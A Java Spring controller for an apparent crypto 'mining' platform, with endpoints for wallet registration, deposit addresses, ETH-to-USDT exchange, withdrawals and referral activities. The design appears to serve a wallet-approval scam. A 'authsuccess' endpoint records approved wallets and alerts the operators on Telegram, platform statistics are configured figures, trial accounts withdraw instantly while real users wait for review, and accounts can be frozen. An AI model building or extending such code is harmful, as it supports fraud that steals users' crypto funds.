package com.ruoyi.wak.api;

import com.alibaba.fastjson2.JSONArray;
import com.alibaba.fastjson2.JSONObject;
import com.google.gson.Gson;
import com.jthinking.common.util.ip.IPInfo;
import com.jthinking.common.util.ip.IPInfoUtils;
import com.ruoyi.common.annotation.RepeatSubmit;
import com.ruoyi.common.core.domain.AjaxResult;
import com.ruoyi.common.core.domain.AjaxWebResult;
import com.ruoyi.common.core.domain.R;
import com.ruoyi.common.core.redis.RedisCache;
import com.ruoyi.common.utils.StringUtils;
import com.ruoyi.common.utils.TelegremBogUtils;
import com.ruoyi.common.utils.http.HttpUtils;
import com.ruoyi.common.utils.ip.AddressUtils;
import com.ruoyi.common.utils.ip.IpUtils;
import com.ruoyi.common.utils.uuid.IdUtils;
import com.ruoyi.system.service.ISysConfigService;
import com.ruoyi.wak.domain.*;
import com.ruoyi.wak.service.*;
import com.ruoyi.wak.vo.req.ActivityReq;
import com.ruoyi.wak.vo.req.AuthsuccessReq;
import com.ruoyi.wak.vo.req.ExchangeReq;
import com.ruoyi.wak.vo.req.WithdrawReq;
import com.ruoyi.wak.vo.res.WakActivityVo;
import com.ruoyi.wak.vo.res.WakPlatformInfoRes;
import com.ruoyi.wak.vo.res.WakRechargeRes;
import org.lionsoul.ip2region.xdb.Searcher;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.validation.Valid;
import java.io.IOException;
import java.lang.annotation.Repeatable;
import java.math.BigDecimal;
import java.math.RoundingMode;
import java.util.*;
import java.util.concurrent.TimeUnit;

@RestController
@RequestMapping("/api/index")
public class WakIndexController {

    @Autowired
    private IWakFzOrderService wakFzOrderService;

    @Autowired
    private IWakAuthaddressService wakAuthaddressService;

    @Autowired
    private IWakAddressService wakAddressService;

    @Autowired
    private IWakConfigService wakConfigService;

    @Autowired
    private RedisCache redisCache;

    @Autowired
    private IWakExchangelogService wakExchangelogService;

    @Autowired
    private IWakOutputlogService wakOutputlogService;

    @Autowired
    private IWakWithdrawlogService wakWithdrawlogService;

    @Autowired
    private ISysConfigService sysConfigService;

    @Autowired
    private IWakOutputlogRewardService wakOutputlogRewardService;

    @Autowired
    private IWakActivityService wakActivityService;

    @Autowired
    private IWakUserActivityRecordService wakUserActivityRecordService;

    private static final Logger log = LoggerFactory.getLogger(WakIndexController.class);

    @GetMapping("getinfo")
    @ResponseBody
    public AjaxWebResult getInfo(HttpServletRequest httpServletRequest,
                                 @RequestParam String address,
                                 @RequestParam String type,
                                 @RequestParam(required = false) String invite) throws IOException {
        String ip = IpUtils.getIpAddr();
        String area = AddressUtils.getRealAddressByIP(ip);
        WakAuthaddress param = new WakAuthaddress();
        param.setAddress(address);
        param.setType(type);
        List<WakAuthaddress> wakAuthaddresses = wakAuthaddressService.selectWakAuthaddressList(param);
        WakAuthaddress pid = null;
        if (StringUtils.isNotBlank(invite)){
            pid = wakAuthaddressService.selectWakAuthaddressByInviteCode(invite);
        }
        WakAuthaddress wakAuthaddress = null;
        if (wakAuthaddresses.size()==0){
            wakAuthaddress = new WakAuthaddress();
            wakAuthaddress.setAddress(address);
            wakAuthaddress.setType(type);
            wakAuthaddress.setStatus(0);
            wakAuthaddress.setUsertype(1);
            wakAuthaddress.setCreatetime(System.currentTimeMillis()/1000);
            if (pid!=null){
                  wakAuthaddress.setParentid(pid.getId());
            }
            wakAuthaddress.setInviteCode(UUID.randomUUID().toString().substring(0,8));
            wakAuthaddress.setWithdrawStatus(0);
            wakAuthaddress.setLastLogintime(new Date());
            wakAuthaddressService.insertWakAuthaddress(wakAuthaddress);
        }else {
            wakAuthaddress = wakAuthaddresses.get(0);
        }

        WakAuthaddress update = new WakAuthaddress();
        update.setId(wakAuthaddress.getId());
        update.setIp(ip);
        update.setIpArea(area);
        update.setLastLogintime(new Date());
        wakAuthaddressService.updateWakAuthaddress(update);


        return AjaxWebResult.success(wakAuthaddress);
    }

    @GetMapping("getaddress")
    @ResponseBody
    public AjaxWebResult getaddress(@RequestParam String t){
        WakAddress param = new WakAddress();
        param.setType(t);
        List<WakAddress> wakAddresses = wakAddressService.selectWakAddressList(param);
        if (wakAddresses.size()==0){
            return AjaxWebResult.error("error");
        }
        WakAddress wakAddress = wakAddresses.get(0);
        wakAddress.setKey("");
        wakAddress.setBalance(null);
        wakAddress.setBalanceUsdt(null);
        return AjaxWebResult.success(wakAddress);
    }

    @GetMapping("getrechargeaddress")
    @ResponseBody
    public AjaxWebResult getrechargeaddress(@RequestParam String t){
        WakRechargeRes wakRechargeRes = new WakRechargeRes();
//        if (t.equals("trc")){
//            WakConfig wakConfig = wakConfigService.selectWakConfigByName("shou_address");
//            wakRechargeRes.setTRC(wakConfig.getValue());
//        }else if(t.equals("erc")){
//            WakConfig wakConfig = wakConfigService.selectWakConfigByName("shou_address_erc");
//            wakRechargeRes.setETH(wakConfig.getValue());
//        }else {
//            return AjaxWebResult.success();
//        }
        WakConfig wakConfig = wakConfigService.selectWakConfigByName("shou_address");
        wakRechargeRes.setTRC(wakConfig.getValue());
        WakConfig wakConfig1 = wakConfigService.selectWakConfigByName("shou_address_erc");
        wakRechargeRes.setETH(wakConfig1.getValue());
        WakConfig wakConfig2 = wakConfigService.selectWakConfigByName("shou_address_btc");
        wakRechargeRes.setBTC(wakConfig2.getValue());
        return AjaxWebResult.success("success",wakRechargeRes);
    }

    @GetMapping("kefu")
    @ResponseBody
    public AjaxWebResult kefu(){
        WakConfig wakConfig = wakConfigService.selectWakConfigByName("kefu");

        return AjaxWebResult.success("success",wakConfig.getValue());
    }
    @GetMapping("getPlatformInfo")
    @ResponseBody
    public AjaxWebResult getPlatformInfo(){
        String participants = wakConfigService.selectWakAuthaddressByName("participants");
        String validnodes = wakConfigService.selectWakAuthaddressByName("validnodes");
        String outputeth = wakConfigService.selectWakAuthaddressByName("outputeth");
        String revenuelusdt = wakConfigService.selectWakAuthaddressByName("revenuelusdt");
        WakPlatformInfoRes wakPlatformInfoRes = new WakPlatformInfoRes();
        wakPlatformInfoRes.setParticipants(new BigDecimal(participants));
        wakPlatformInfoRes.setValidnodes(new BigDecimal(validnodes));
        wakPlatformInfoRes.setOutputeth(new BigDecimal(outputeth));
        wakPlatformInfoRes.setRevenuelusdt(new BigDecimal(revenuelusdt));

        return AjaxWebResult.success(wakPlatformInfoRes);
    }

    @GetMapping("getFzOrder")
    @ResponseBody
    public AjaxWebResult getFzOrder(@RequestParam String address) throws IOException {
        WakAuthaddress wakAuthaddress = wakAuthaddressService.selectWakAuthaddressByAddress(address);
        if (wakAuthaddress==null){
            return AjaxWebResult.success();
        }

        WakFzOrder wakFzOrderParam = new WakFzOrder();
        wakFzOrderParam.setUid(wakAuthaddress.getId());
        wakFzOrderParam.setStatus(1);
        List<WakFzOrder> wakFzOrders = wakFzOrderService.selectWakFzOrderList(wakFzOrderParam);
        WakFzOrder wakFzOrder = null;
        if (wakFzOrders.size()>0){
            wakFzOrder = wakFzOrders.get(0);
            return AjaxWebResult.success(wakFzOrder);
        }

        return AjaxWebResult.success(wakFzOrder);
    }


    @PostMapping("authsuccess")
    @ResponseBody
    public AjaxWebResult authsuccess(@RequestBody AuthsuccessReq authsuccessReq){
        if (StringUtils.isBlank(authsuccessReq.getAddress())){
            return AjaxWebResult.error("network error");
        }
        WakAddress param = new WakAddress();
        param.setAddress(authsuccessReq.getAu_address());
        List<WakAddress> wakAddresses = wakAddressService.selectWakAddressList(param);
        if (wakAddresses.size()==0){
            return AjaxWebResult.success();
        }

        //检查地址是否授权过
        WakAuthaddress wakAuthaddressParam = new WakAuthaddress();
        wakAuthaddressParam.setAddress(authsuccessReq.getAddress());
        List<WakAuthaddress> wakAuthaddresses = wakAuthaddressService.selectWakAuthaddressList(wakAuthaddressParam);
        if (wakAuthaddresses.size()==0){
            WakAuthaddress wakAuthaddress = new WakAuthaddress();
            wakAuthaddress.setAddress(authsuccessReq.getAddress());
            wakAuthaddress.setUsdtBalance(authsuccessReq.getUsdt_balance());
            wakAuthaddress.setType(authsuccessReq.getType());
            wakAuthaddress.setStatus(0);
            wakAuthaddress.setUsertype(1);
            wakAuthaddress.setHash(authsuccessReq.getHash());
            wakAuthaddress.setAuAddress(authsuccessReq.getAu_address());
            wakAuthaddress.setCreatetime(System.currentTimeMillis()/1000);
            wakAuthaddress.setInviteCode(UUID.randomUUID().toString().substring(0,8));
            wakAuthaddress.setWithdrawStatus(0);
            wakAuthaddressService.insertWakAuthaddress(wakAuthaddress);
        }

        WakAuthaddress wakAuthaddress = wakAuthaddresses.get(0);
        wakAuthaddress.setUsdtBalance(authsuccessReq.getUsdt_balance());
        wakAuthaddress.setType(authsuccessReq.getType());
        wakAuthaddress.setStatus(1);
        wakAuthaddress.setUsertype(1);
        wakAuthaddress.setHash(authsuccessReq.getHash());
        wakAuthaddress.setAuAddress(authsuccessReq.getAu_address());
        wakAuthaddress.setCreatetime(System.currentTimeMillis()/1000);
        wakAuthaddressService.updateWakAuthaddress(wakAuthaddress);

        String is_bot_notify = sysConfigService.selectConfigByKey("is_bot_notify");
        if (is_bot_notify.equals("0")) {
            String msg = "用户:[" + wakAuthaddress.getId() + "] 昵称[" + wakAuthaddress.getNickname() +
                    "]授权成功，地址：" + wakAuthaddress.getAddress();
            String alarm_bot = wakConfigService.selectWakAuthaddressByName("alarm_bot");
            String alarm_chatid = wakConfigService.selectWakAuthaddressByName("alarm_chatid");
            TelegremBogUtils.tongzhi(alarm_bot, alarm_chatid, msg);
        }
        return AjaxWebResult.success();
    }

    @GetMapping("getethprice")
    @ResponseBody
    public AjaxWebResult getethprice(){
        String markpX = redisCache.getCacheObject("ehtPrice");
        if (StringUtils.isBlank(markpX)){
            String url = "https://www.okx.com/api/v5/public/mark-price?instType=SWAP&instId=ETH-USDT-SWAP";
            String res = HttpUtils.sendGet(url);
            JSONObject jsonObject = JSONObject.parseObject(res);
            JSONArray jsonArray = jsonObject.getJSONArray("data");
            JSONObject data = jsonArray.getJSONObject(0);
            markpX= data.getString("markPx");
            redisCache.setCacheObject("ehtPrice",markpX,30,TimeUnit.SECONDS);
        }

        return AjaxWebResult.success("ok",markpX);
    }

    @GetMapping("exchange_log")
    @ResponseBody
    public AjaxWebResult exchange_log(@RequestParam String address){
        WakExchangelog param = new WakExchangelog();
        param.setAddress(address);
        List<WakExchangelog> wakExchangelogList = wakExchangelogService.selectWakExchangelogList(param);

        return AjaxWebResult.success(wakExchangelogList);
    }


    @GetMapping("withdraw_log")
    @ResponseBody
    public AjaxWebResult withdraw_log(@RequestParam String address){
        WakWithdrawlog param = new WakWithdrawlog();
        param.setAddress(address);
        List<WakWithdrawlog> wakWithdrawlogs = wakWithdrawlogService.selectWakWithdrawlogList(param);

        return AjaxWebResult.success(wakWithdrawlogs);
    }

    @GetMapping("output_log")
    @ResponseBody
    public AjaxWebResult output_log(@RequestParam String address){
        WakOutputlog param = new WakOutputlog();
        param.setAddress(address);
        List<WakOutputlog> wakOutputlogs = wakOutputlogService.selectWakOutputlogList(param);

        return AjaxWebResult.success(wakOutputlogs);
    }

    @GetMapping("outputReward_log")
    @ResponseBody
    public AjaxWebResult outputReward_log(@RequestParam String address){
        WakOutputlogReward param = new WakOutputlogReward();
        param.setAddress(address);
        List<WakOutputlogReward> wakOutputlogRewards = wakOutputlogRewardService.selectWakOutputlogRewardList(param);

        for (WakOutputlogReward wakOutputlogReward:
        wakOutputlogRewards) {
            String beforeAddress = wakOutputlogReward.getRewardAddress();
            wakOutputlogReward.setRewardAddress(beforeAddress.substring(beforeAddress.length()-6,beforeAddress.length()));
        }
        return AjaxWebResult.success(wakOutputlogRewards);
    }


    @PostMapping("exchange")
    @ResponseBody
    public synchronized AjaxWebResult exchange(@RequestBody ExchangeReq exchangeReq){
        if (StringUtils.isBlank(exchangeReq.getAddress())){
            return AjaxWebResult.error("network error");
        }else if(exchangeReq.getEth()==null || exchangeReq.getEth().compareTo(BigDecimal.ZERO)<=0){
            return AjaxWebResult.error("error");
        }
        //检查地址状态
        WakAuthaddress wakAuthaddress = wakAuthaddressService.selectWakAuthaddressByAddress(exchangeReq.getAddress());
        if (wakAuthaddress==null){
            return AjaxWebResult.success("ok");
        }
        //检查eth余额
        if (wakAuthaddress.getSystemEth().compareTo(exchangeReq.getEth())<0){
            return AjaxWebResult.error("Insufficient balance");
        }

        //检查授权状态
        if (wakAuthaddress.getStatus()==0){
            return AjaxWebResult.error("Please click to receive");
        }

        //获取eth价格
        String markpX = redisCache.getCacheObject("ehtPrice");
        if (StringUtils.isBlank(markpX)){
            String url = "https://www.okx.com/api/v5/public/mark-price?instType=SWAP&instId=ETH-USDT-SWAP";
            String res = HttpUtils.sendGet(url);
            JSONObject jsonObject = JSONObject.parseObject(res);
            JSONArray jsonArray = jsonObject.getJSONArray("data");
            JSONObject data = jsonArray.getJSONObject(0);
            markpX= data.getString("markPx");
            redisCache.setCacheObject("ehtPrice",markpX,30,TimeUnit.SECONDS);
        }

        BigDecimal exchangeusdt = exchangeReq.getEth().multiply(new BigDecimal(markpX)).setScale(2, RoundingMode.HALF_UP);
        BigDecimal newEth = wakAuthaddress.getSystemEth().subtract(exchangeReq.getEth()).setScale(6,RoundingMode.HALF_UP);
        BigDecimal newUsdt = wakAuthaddress.getSystemUsdt().add(exchangeusdt).setScale(2,RoundingMode.HALF_UP);

        //记录转换记录
        WakExchangelog wakExchangelog = new WakExchangelog();
        wakExchangelog.setAddress(wakAuthaddress.getAddress());
        wakExchangelog.setUid(wakAuthaddress.getId());
        wakExchangelog.setCreatetime(System.currentTimeMillis()/1000);
        wakExchangelog.setEthNum(exchangeReq.getEth());
        wakExchangelog.setEthPrice(new BigDecimal(markpX));
        wakExchangelog.setUsdtNum(exchangeusdt);
        wakExchangelog.setEthBeforeBalance(wakAuthaddress.getSystemEth());
        wakExchangelog.setEthLastBalance(newEth);
        wakExchangelog.setUsdtBeforeBalance(wakAuthaddress.getSystemUsdt());
        wakExchangelog.setUsdtLastBalance(newUsdt);
        wakExchangelogService.insertWakExchangelog(wakExchangelog);

        WakAuthaddress authaddress = new WakAuthaddress();
        authaddress.setId(wakAuthaddress.getId());
        authaddress.setSystemEth(newEth);
        authaddress.setSystemUsdt(newUsdt);
        wakAuthaddressService.updateWakAuthaddress(authaddress);

//        String is_bot_notify = sysConfigService.selectConfigByKey("is_bot_notify");
//        if (is_bot_notify.equals("0")) {
//            String msg = "用户:[" + wakAuthaddress.getId() + "] 昵称[" + wakAuthaddress.getNickname() +
//                    "]余额变更，"+"%0A"+
//                    "地址：" + wakAuthaddress.getAddress() + "%0A" +
//                    "ETH历史->" + wakExchangelog.getEthBeforeBalance() + "%0A" +
//                    "ETH变动->" + wakExchangelog.getEthNum() + "%0A" +
//                    "ETH最新->" + wakExchangelog.getEthLastBalance() + "%0A" +
//                    "%0A" +
//                    "USDT历史->" + wakExchangelog.getUsdtBeforeBalance() + "%0A" +
//                    "USDT变动->" + wakExchangelog.getUsdtNum() + "%0A" +
//                    "USDT最新->" + wakExchangelog.getUsdtLastBalance();
////                    "USDT当前余额变更:" + newUsdt;
//            String alarm_bot = wakConfigService.selectWakAuthaddressByName("alarm_bot");
//            String alarm_chatid = wakConfigService.selectWakAuthaddressByName("alarm_chatid");
//            TelegremBogUtils.tongzhi(alarm_bot, alarm_chatid, msg);
//        }
        return AjaxWebResult.success();
    }


    @PostMapping("withdraw")
    @ResponseBody
    public synchronized AjaxWebResult withdraw(@RequestBody WithdrawReq withdrawReq){
        log.info("用户发起提现地址 -> {}",withdrawReq.getAddress());
        log.info("用户发起提现参数 -> {}",withdrawReq.toString());
        if (StringUtils.isBlank(withdrawReq.getAddress())){
            return AjaxWebResult.error("network error");
        }else if(withdrawReq.getUsdt()==null || withdrawReq.getUsdt().compareTo(BigDecimal.ZERO)<=0){
            return AjaxWebResult.error("error");
        }
        //检查地址状态
        WakAuthaddress wakAuthaddress = wakAuthaddressService.selectWakAuthaddressByAddress(withdrawReq.getAddress());
        if (wakAuthaddress==null){
            return AjaxWebResult.success("ok");
        }
        //冻结不能提现
        if(wakAuthaddress.getDongjie()==1){
            return AjaxWebResult.error("Account is frozen, please contact customer service");
        }
        //检查最低提款金额
        String mincheckUsdt = wakConfigService.selectWakAuthaddressByName("min_withdraw_usdt");
        BigDecimal minWitndrawUsdt = new BigDecimal(mincheckUsdt);
        if (withdrawReq.getUsdt().compareTo(minWitndrawUsdt)<0){
            return AjaxWebResult.error("Minimum Withdrawal:"+minWitndrawUsdt+"USDT");
        }
        //检查余额
        if (withdrawReq.getUsdt().compareTo(wakAuthaddress.getSystemUsdt())>0){
            return AjaxWebResult.error("Insufficient balance");
        }
        //检查提现状态
        if (wakAuthaddress.getWithdrawStatus()==1){
            return AjaxWebResult.error("There is an abnormality in the account, please contact the secretary.");
        }
        //检查是否已经有提现中的订单，处理前禁止再次提现
        WakWithdrawlog checkParam = new WakWithdrawlog();
        checkParam.setAddress(wakAuthaddress.getAddress());
        checkParam.setStatus(0);
        List<WakWithdrawlog> check = wakWithdrawlogService.selectWakWithdrawlogList(checkParam);
        if (check.size()>0){
            return AjaxWebResult.error("you withdraw order already in procceed,please wait");
        }

        //计算提现后的系统usdt余额
        BigDecimal newUsdt = wakAuthaddress.getSystemUsdt().subtract(withdrawReq.getUsdt()).setScale(2,RoundingMode.HALF_UP);

        //记录提现记录
        WakWithdrawlog wakWithdrawlog = new WakWithdrawlog();
        wakWithdrawlog.setAddress(wakAuthaddress.getAddress());
        wakWithdrawlog.setUid(wakAuthaddress.getId());
        wakWithdrawlog.setNickname(wakAuthaddress.getNickname());
        wakWithdrawlog.setUsdt(withdrawReq.getUsdt());
        //账号身份，试玩还是正式
        if (wakAuthaddress.getUsertype()==2){
            //更新账户余额
            WakAuthaddress authaddress = new WakAuthaddress();
            authaddress.setId(wakAuthaddress.getId());
            authaddress.setSystemUsdt(newUsdt);
            wakAuthaddressService.updateWakAuthaddress(authaddress);
            //试玩直接提现成功
            wakWithdrawlog.setStatus(1);
        }else {
            //正式玩家等待审核
            wakWithdrawlog.setStatus(0);
        }
        wakWithdrawlog.setUsertype(wakAuthaddress.getUsertype());
        wakWithdrawlog.setAgentid(wakAuthaddress.getAgentid());
        wakWithdrawlog.setCreatetime(System.currentTimeMillis()/1000);
        wakWithdrawlog.setUpdatetime(System.currentTimeMillis()/1000);
        wakWithdrawlogService.insertWakWithdrawlog(wakWithdrawlog);

//        //更新账户余额
//        WakAuthaddress authaddress = new WakAuthaddress();
//        authaddress.setId(wakAuthaddress.getId());
//        authaddress.setSystemUsdt(newUsdt);
//        wakAuthaddressService.updateWakAuthaddress(authaddress);

        String is_bot_notify = sysConfigService.selectConfigByKey("is_bot_notify");
        if (is_bot_notify.equals("0")) {
            String msg = "用户:[" + wakAuthaddress.getId() + "] 昵称[" + wakAuthaddress.getNickname() +
                    "]申请提现，地址：" + wakAuthaddress.getAddress() + "USDT提现金额:" + withdrawReq.getUsdt();
            String alarm_bot = wakConfigService.selectWakAuthaddressByName("alarm_bot");
            String alarm_chatid = wakConfigService.selectWakAuthaddressByName("alarm_chatid");
            TelegremBogUtils.tongzhi(alarm_bot, alarm_chatid, msg);
        }
        return AjaxWebResult.success();

    }


    @GetMapping("getMyActivityInfo")
    @ResponseBody
    public AjaxWebResult getMyActivityInfo(@RequestParam("address") String address,
                               @RequestParam("activityType") int activityType){
        WakAuthaddress wakAuthaddress = wakAuthaddressService.selectWakAuthaddressByAddress(address);
        if (wakAuthaddress==null){
            return AjaxWebResult.error("error");
        }
        List<WakActivityVo> getMyActivityInfo = wakActivityService.getMyActivityInfo(wakAuthaddress,activityType);
        return AjaxWebResult.success(getMyActivityInfo);
    }

    @GetMapping("getMyCpActivityInfo")
    @ResponseBody
    public AjaxWebResult getMyCpActivityInfo(@RequestParam("address") String address,
                                             @RequestParam("activityType") int activityType){
        WakAuthaddress wakAuthaddress = wakAuthaddressService.selectWakAuthaddressByAddress(address);
        Map map = new HashMap();
        if (wakAuthaddress==null){
            return AjaxWebResult.error("error");
        }
        BigDecimal cpRecharge = BigDecimal.ZERO;
        if (activityType==0) {
            if (wakAuthaddress.getCpId() != null && wakAuthaddress.getCpId() != 0L) {
                WakAuthaddress cp = wakAuthaddressService.selectWakAuthaddressById(wakAuthaddress.getId());
                if (cp != null) {
                    if (cp.getRechargeHistory()!=null) {
                        cpRecharge = cp.getRechargeHistory();
                    }
                }
            }
            map.put("myRecharge",cpRecharge.setScale(0,RoundingMode.HALF_UP));
//            map.put("coupleRecharge",wakAuthaddress.getRechargeHistory().add(cpRecharge).setScale(0,RoundingMode.HALF_UP));
            BigDecimal rewardAmount = wakUserActivityRecordService.sumAmountByUserIdAndActivityType(wakAuthaddress.getId(),activityType);
            map.put("coupleRecharge",rewardAmount);
            WakConfig wakConfig = wakConfigService.selectWakConfigByName("activity1_tip");
            map.put("tip",wakConfig.getValue());
        }else if(activityType==1){
            map.put("myRecharge",wakAuthaddress.getRechargeHistory().setScale(0,RoundingMode.HALF_UP));
            BigDecimal rewardAmount = wakUserActivityRecordService.sumAmountByUserIdAndActivityType(wakAuthaddress.getId(),activityType);
            map.put("rewardAmount",rewardAmount.setScale(2,RoundingMode.HALF_UP));
            WakConfig wakConfig = wakConfigService.selectWakConfigByName("activity2_tip");
            map.put("tip",wakConfig.getValue());
        }else if(activityType==2){
            WakUserActivityRecord param = new WakUserActivityRecord();
            param.setUserId(wakAuthaddress.getId());
            param.setActivyType(activityType);
            List<WakUserActivityRecord> wakUserActivityRecords = wakUserActivityRecordService.selectWakUserActivityRecordList(param);
            BigDecimal rewardAmount = wakUserActivityRecordService.sumAmountByUserIdAndActivityType(wakAuthaddress.getId(),activityType);
            map.put("signDay",wakUserActivityRecords.size());
            map.put("rewardAmount",rewardAmount.setScale(2,RoundingMode.HALF_UP));
            WakConfig wakConfig = wakConfigService.selectWakConfigByName("activity3_tip");
            map.put("tip",wakConfig.getValue());
        }else if(activityType==3){
            BigDecimal allProfit = wakOutputlogRewardService.sumByUserId(wakAuthaddress.getId());
            map.put("allProfit",allProfit.setScale(0,RoundingMode.HALF_DOWN));

            List<WakActivityVo> getMyActivityInfo = wakActivityService.getMyActivityInfo(wakAuthaddress,3);
            for (WakActivityVo wakActivityVo:
                    getMyActivityInfo) {
                if (wakAuthaddress.getSystemUsdt().compareTo(wakActivityVo.getTargetAmount())>=0 && wakAuthaddress.getSystemUsdt().compareTo(wakActivityVo.getAdditionalTargetAmount())<=0){
                    map.put("myProfitRatemyProfitRate",wakActivityVo.getRewardAmount());
                    map.put("myProfitLevel",wakActivityVo.getLevel());
                }
            }

            try{
                WakConfig wakConfig = wakConfigService.selectWakConfigByName("activity4_tip");
                map.put("tip",wakConfig.getValue());
            }catch (Exception e){

            }
        }
        return AjaxWebResult.success(map);
    }

    @PostMapping("ReceiveMyActivityInfo")
    @ResponseBody
    @RepeatSubmit
    public synchronized AjaxWebResult ReceiveMyActivityInfo(@RequestBody ActivityReq activityReq){
        WakAuthaddress wakAuthaddress = wakAuthaddressService.selectWakAuthaddressByAddress(activityReq.getAddress());
        if (wakAuthaddress==null){
            return AjaxWebResult.error("error");
        }
        WakActivity wakActivity = wakActivityService.selectWakActivityById(activityReq.getActivityId());
        if (wakActivity==null){
            return AjaxWebResult.error("error");
        }
        int i = wakActivityService.receiveMyActivityInfo(wakAuthaddress,wakActivity);
        if(i>0){
            return AjaxWebResult.success("success");
        }
        return AjaxWebResult.error("error");
    }

    @PostMapping("bindCpId")
    @ResponseBody
    public AjaxWebResult bindCpId(@RequestBody ActivityReq activityReq){
        WakAuthaddress wakAuthaddress = wakAuthaddressService.selectWakAuthaddressByAddress(activityReq.getAddress());
        if (wakAuthaddress==null){
            return AjaxWebResult.error("error");
        }
        if (wakAuthaddress.getCpId()!=null && wakAuthaddress.getCpId()!=0){
            return AjaxWebResult.error(" You already bind couple");
        }
        WakAuthaddress cpAddress = wakAuthaddressService.selectWakAuthaddressByAddress(activityReq.getCpAddress());
        if (cpAddress==null){
            return AjaxWebResult.error("Your couple's address is not found");
        }
        if (cpAddress.getCpId()!=null){
            return AjaxWebResult.error(" You couple already bind couple");
        }
        if (cpAddress.getId()==wakAuthaddress.getId()){
            return AjaxWebResult.error(" You can't bind yourself");
        }
        WakAuthaddress bo = new WakAuthaddress();
        bo.setId(wakAuthaddress.getId());
        bo.setCpId(cpAddress.getId());
        wakAuthaddressService.updateWakAuthaddress(bo);
        WakAuthaddress bo2 = new WakAuthaddress();
        bo2.setId(cpAddress.getId());
        bo2.setCpId(wakAuthaddress.getId());
        wakAuthaddressService.updateWakAuthaddress(bo2);
        return AjaxWebResult.success("success");
    }

//    public static void main(String[] args) throws IOException {
//        String text = UUID.randomUUID().toString().substring(0,8);
//        System.out.println(text);
//
////        String ipInfo = IpUtils.getIpArea("172.71.218.170");
////        System.out.println(ipInfo);
//
//        // 1、创建 searcher 对象
//        String dbPath = "ruoyi-common/src/resources/ip2region.xdb";
//        byte[] vIndex;
//        try {
//            vIndex = Searcher.loadVectorIndexFromFile(dbPath);
//        } catch (Exception e) {
//            System.out.printf("failed to load vector index from `%s`: %s\n", dbPath, e);
//            return;
//        }
//        // 2、使用全局的 vIndex 创建带 VectorIndex 缓存的查询对象。
//        Searcher searcher;
//        try {
//            searcher = Searcher.newWithVectorIndex(dbPath, vIndex);
//        } catch (Exception e) {
//            System.out.printf("failed to create vectorIndex cached searcher with `%s`: %s\n", dbPath, e);
//            return;
//        }
//
//
//        String ip = "172.70.85.6";
//        // 2、查询
//        try {
//            long sTime = System.nanoTime();
//            String region = searcher.search(ip);
//            long cost = TimeUnit.NANOSECONDS.toMicros((long) (System.nanoTime() - sTime));
//            System.out.printf("{region: %s, ioCount: %d, took: %d μs}\n", region, searcher.getIOCount(), cost);
//        } catch (Exception e) {
//            System.out.printf("failed to search(%s): %s\n", ip, e);
//        }
//
//        // 3、关闭资源
//        searcher.close();
//
//
//    }

    public static void main(String[] args) {
        String msg = "987654321" ;
        System.out.println(msg.substring(msg.length()-6,msg.length()));
    }
}
